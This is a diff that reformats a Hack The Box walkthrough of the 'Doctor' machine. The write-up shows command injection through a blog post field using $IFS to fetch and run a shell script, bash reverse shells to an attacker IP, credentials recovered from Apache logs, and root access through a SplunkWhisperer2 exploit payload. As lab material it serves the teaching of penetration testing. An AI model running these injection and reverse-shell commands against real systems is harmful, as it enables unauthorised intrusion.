@@ -2,7 +2,7 @@
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](https://github.com/zweilosec/htb-writeups/tree/055d114fa0e4f23274338e658b73ae4b8e9a7b61/linux-machines/easy/machine%3E.infocard.png)
 
 Short description to include any strange things to be dealt with
 
@@ -10,11 +10,11 @@ Short description to include any strange things to be dealt with
 
 #### Useful thing 1
 
-- description with generic example
+* description with generic example
 
 #### Useful thing 2
 
-- description with generic example
+* description with generic example
 
 ## Enumeration
 
@@ -22,7 +22,7 @@ Short description to include any strange things to be dealt with
 
 I started my enumeration with an nmap scan of `10.10.10.209`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/doctor]
 └─$ nmap -sCV -n -p- -Pn -v -oA doctor 10.10.10.209                                              130 ⨯
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
@@ -107,18 +107,18 @@ Further down the page found some potential usernames: Dr. Jade Guzman, Dr. Hanna
 
 ### Port 8089 - Splunk
 
-Needed to use https.  After accepting the security warnings about the self-signed certificates was led to a Splunk Atom Feed.
+Needed to use https. After accepting the security warnings about the self-signed certificates was led to a Splunk Atom Feed.
 
 Splunk build: 8.0.5
 
-https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/
+[https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
 
-> Universal Forwarder is accessible on each host at https://host:8089. Accessing any of the protected API calls, such as /service/ pops up a Basic authentication box. The username is always admin, and the password default used to be changeme until 2016 when Splunk required any new installations to set a password of 8 characters or higher. 
+> Universal Forwarder is accessible on each host at [https://host:8089](https://host:8089). Accessing any of the protected API calls, such as /service/ pops up a Basic authentication box. The username is always admin, and the password default used to be changeme until 2016 when Splunk required any new installations to set a password of 8 characters or higher.
 
 Crafting a python password brute force tool
 
-* https://requests.readthedocs.io/en/master/user/advanced/#ssl-cert-verification
-* https://stackoverflow.com/questions/15445981/how-do-i-disable-the-security-certificate-check-in-python-requests
+* [https://requests.readthedocs.io/en/master/user/advanced/\#ssl-cert-verification](https://requests.readthedocs.io/en/master/user/advanced/#ssl-cert-verification)
+* [https://stackoverflow.com/questions/15445981/how-do-i-disable-the-security-certificate-check-in-python-requests](https://stackoverflow.com/questions/15445981/how-do-i-disable-the-security-certificate-check-in-python-requests)
 
 ```python
 import requests
@@ -164,9 +164,9 @@ Testing for SQLi gives me an error " Nope, no such luck. "
 
 found link to /archive in source code, this page is blank with no content
 
-While trying XSS testing in the message post there was an error that said the URL was not valid, but I still got a connection back 
+While trying XSS testing in the message post there was an error that said the URL was not valid, but I still got a connection back
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/doctor]
 └─$ nc -lvnp 8081
 listening on [any] 8081 ...
@@ -177,9 +177,9 @@ User-Agent: curl/7.68.0
 Accept: */*
 ```
 
-Looks like the service is running `curl`.  If there is no input sanitization I may be able to get code execution here
+Looks like the service is running `curl`. If there is no input sanitization I may be able to get code execution here
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/doctor]
 └─$ nc -lvnp 8081                                                                                130 ⨯
 listening on [any] 8081 ...
@@ -194,15 +194,15 @@ Putting in a command at the end of my URL results in a request with the `id` con
 
 It seemed as if I couldn't use any commands with spaces, any commands I sent with spaces did not connect back
 
-https://www.betterhacker.com/2016/10/command-injection-without-spaces.html
+[https://www.betterhacker.com/2016/10/command-injection-without-spaces.html](https://www.betterhacker.com/2016/10/command-injection-without-spaces.html)
 
 Didn't work
 
-https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces
+[https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces](https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces)
 
 in bash $IFS is a space by default
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/doctor]
 └─$ python3 -m http.server 8081
 Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
@@ -245,7 +245,7 @@ bash -i >& /dev/tcp/10.10.15.13/8091 0>&1
 
 my shell script which simply contained a bash reverse shell
 
-```
+```text
 title=Passwd+Extract&content=http://10.10.15.13:8081/$(curl$IFS'http://10.10.15.13:8081/shell'$IFS'-o'$IFS'/dev/shm/shell')&submit=Post
 
 title=Passwd+Extract&content=http://10.10.15.13:8081/$(chmod$IFS'+x'$IFS'/dev/shm/shell')&submit=Post
@@ -255,7 +255,7 @@ title=Passwd+Extract&content=http%3a//10.10.15.13%3a8081/$(bash$IFS'/dev/shm/she
 
 The three commands I sent through burp traffic: sending the file using curl, chmod +x to make executable, and executing my shell script
 
-```
+```text
 10.10.10.209 - - [07/Feb/2021 21:47:19] "GET /exim:x:31:31:Exim HTTP/1.1" 404 -                         
 10.10.10.209 - - [12/Feb/2021 19:16:30] "GET / HTTP/1.1" 200 -                                          
 10.10.10.209 - - [12/Feb/2021 19:17:53] "GET / HTTP/1.1" 200 -
@@ -269,12 +269,11 @@ The three commands I sent through burp traffic: sending the file using curl, chm
 
 I got a connection back from the remote host which downloaded my shell script
 
-
 ## Initial Foothold
 
 ## Road to User
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/doctor]
 └─$ nc -lvnp 8091                                                                                   1 ⨯
 listening on [any] 8091 ...
@@ -293,12 +292,11 @@ export TERM=xterm-256color
 web@doctor:~$
 ```
 
-After the shell script ran I receieved a connection from the reverse shell to my waiting netcat listener.  Python2 wasn't installed, but python3 was.+-
-
+After the shell script ran I receieved a connection from the reverse shell to my waiting netcat listener. Python2 wasn't installed, but python3 was.+-
 
 ### Further enumeration
 
-```
+```text
 web@doctor:~$ id && hostname
 id && hostname
 uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
@@ -309,7 +307,7 @@ I was running as the user `web` which I immediately noticed was a member of the 
 
 ### Finding user creds
 
-```
+```text
 web@doctor:~$ find / -group adm 2>/dev/null
 find / -group adm 2>/dev/null
 /proc/1037
@@ -397,7 +395,7 @@ web@doctor:~$
 
 `adm` group can access process files and logs in /var/log
 
-```
+```text
 web@doctor:/var/log$ grep password * 2>/dev/null
 grep password * 2>/dev/null
 auth.log:Feb 12 07:04:10 doctor VGAuth[664]: vmtoolsd: Username and password successfully validated for 'root'.
@@ -422,7 +420,7 @@ auth.log.1:Sep 22 13:01:28 doctor sshd[1704]: Failed password for invalid user s
 
 no passwords in these log files
 
-```
+```text
 web@doctor:/var/log/apache2$ grep -i pass * 2>/dev/null
 grep -i pass * 2>/dev/null
 access.log.1:10.10.14.70 - - [12/Feb/2021:11:17:55 +0100] "GET /.htpasswd HTTP/1.1" 403 438 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
@@ -448,13 +446,11 @@ backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=G
 error.log.1:[Fri Feb 12 11:17:55.910884 2021] [authz_core:error] [pid 2637] [client 10.10.14.70:49358] AH01630: client denied by server configuration: /var/www/html/.htpasswd
 ```
 
-however in the apache2 folder there was a file named access.log.1 that contained even more log information, including a history of web searches for how to crack passwords and creating strong passwords.  Then, in the file `backup` I found a attempt by the user to change thier password.  It seems like the user got scared and decided to change his web password.  I decided to check if this password would work for the other user on the machine (`shaun`).
-
-
+however in the apache2 folder there was a file named access.log.1 that contained even more log information, including a history of web searches for how to crack passwords and creating strong passwords. Then, in the file `backup` I found a attempt by the user to change thier password. It seems like the user got scared and decided to change his web password. I decided to check if this password would work for the other user on the machine \(`shaun`\).
 
 ### User.txt
 
-```
+```text
 web@doctor:/var/log/apache2$ su shaun     
 su shaun
 Password: Guitar123
@@ -484,13 +480,11 @@ cat user.txt
 d1d591b77e1d5c2457e2cdc9d2bcffad
 ```
 
-
-
 ## Path to Power \(Gaining Administrator Access\)
 
 ### Enumeration as `shaun`
 
-```
+```text
 shaun@doctor:~$ sudo -l 
 sudo -l
 [sudo] password for shaun: Guitar123
@@ -529,8 +523,7 @@ INSERT INTO post VALUES(1,'Doctor blog','2020-09-18 20:48:37.55555','A free blog
 COMMIT;
 ```
 
-https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/
-https://github.com/cnotin/SplunkWhisperer2
+[https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) [https://github.com/cnotin/SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2)
 
 Was able to use `shaun`'s credentials to log into the splunk site
 
@@ -552,7 +545,7 @@ options = parser.parse_args()
 
 In the exploit I had to configure some parameters
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/doctor]
 └─$ python3 PySplunkWhisperer2_remote.py.1 --host doctors.htb --lhost 10.10.15.13 --lport 9001 --username shaun --password Guitar123 --payload "bash -c 'bash -i >& /dev/tcp/10.10.15.13/8092 0>&1'"
 Running in remote mode (Remote Code Execution)
@@ -568,10 +561,9 @@ Running in remote mode (Remote Code Execution)
 Press RETURN to cleanup
 ```
 
-
 ### Root.txt
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/doctor]
 └─$ nc -lvnp 8092                                                                                   1 ⨯
 listening on [any] 8092 ...
@@ -591,7 +583,7 @@ cat root.txt
 
 Got a root shell back, and collected my proof
 
-Note: After finding the username of shaun, my password brute force method would have actually proved useful had I been a patient attacker.  The vulnerable version of splunkd used here does not lock out accounts, so brute force is entirely feasible.  The only problem is shown below.
+Note: After finding the username of shaun, my password brute force method would have actually proved useful had I been a patient attacker. The vulnerable version of splunkd used here does not lock out accounts, so brute force is entirely feasible. The only problem is shown below.
 
 ```bash
 ┌──(zweilos㉿kali-[~/htb/doctor]
@@ -599,7 +591,7 @@ Note: After finding the username of shaun, my password brute force method would 
 2136945:Guitar123
 ```
 
-I used grep to figure out whether `shaun`'s password existed in rockyou.txt, and found that it did indeed exist, but was on line 2,136,945! 
+I used grep to figure out whether `shaun`'s password existed in rockyou.txt, and found that it did indeed exist, but was on line 2,136,945!
 
 ```bash
 ┌──(zweilos㉿kali)-[~/htb/doctor]
@@ -611,9 +603,9 @@ Password found in: 0.26 seconds
 Thank you for using this service!
 ```
 
-Using my python brute force script it took roughly a quarter of a second per try.  This would have taken over 154 hours to guess the correct password (this is assuming single threaded attempts).  So, if the attacker had not been able to get a shell on the box as the web user and used the privilege escalation route, simply getting the username from /etc/passwd would have eventually provided access to a determined attacker!
-
+Using my python brute force script it took roughly a quarter of a second per try. This would have taken over 154 hours to guess the correct password \(this is assuming single threaded attempts\). So, if the attacker had not been able to get a shell on the box as the web user and used the privilege escalation route, simply getting the username from /etc/passwd would have eventually provided access to a determined attacker!
 
 Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for something interesting or useful about this machine.
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
+
